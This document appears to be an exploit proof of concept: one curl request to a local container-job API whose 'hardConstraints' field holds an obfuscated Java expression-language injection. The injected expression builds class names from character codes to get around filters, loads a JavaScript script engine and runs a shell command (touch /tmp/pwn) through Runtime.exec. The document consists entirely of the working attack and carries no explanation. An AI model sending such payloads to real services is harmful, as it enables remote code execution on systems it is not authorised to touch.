curl --location --request POST 'localhost:7001/api/v3/jobs' \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--header 'Content-Type: application/json' \
--data-raw '{
    "applicationName": "myApp",
    "owner": {
        "teamEmail": "hello@gmail.com"
    },
    "container": {
        "resources": {
            "cpu": 1,
            "memoryMB": 128,
            "diskMB": 128,
            "networkMbps": 1
        },
        "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
        "image": {
            "name": "ubuntu",
            "tag": "xenial"
        },
        "softConstraints": {
        },
        "hardConstraints": {
            "constraints": {
                "#{'\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.'\'' + '\''a'\''.replace('\''a'\'', 83) + '\''cript'\'' + '\''a'\''.replace('\''a'\'', 69) + '\''ngine'\'' + '\''a'\''.replace('\''a'\'', 77) + '\''anager'\'')).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.'\'' + '\''a'\''.replace('\''a'\'', 83) + '\''cript'\'' + '\''a'\''.replace('\''a'\'', 69) + '\''ngine'\'' + '\''a'\''.replace('\''a'\'', 77) + '\''anager'\'')), '\''js'\'').compile('\''java.lang.'\'' + '\''a'\''.replace('\''a'\'', 82) +  '\''untime.get'\'' + '\''a'\''.replace('\''a'\'', 82) + '\''untime().exec(\"touch /tmp/pwn\")'\'').eval() + '\'''\''}": "lol"
            }
        }
    },
    "service": {
        "capacity": {
            "min": 1,
            "max": 1,
            "desired": 1
        },
        "retryPolicy": {
            "immediate": {
                "retries": 10
            }
        }
    }
}'
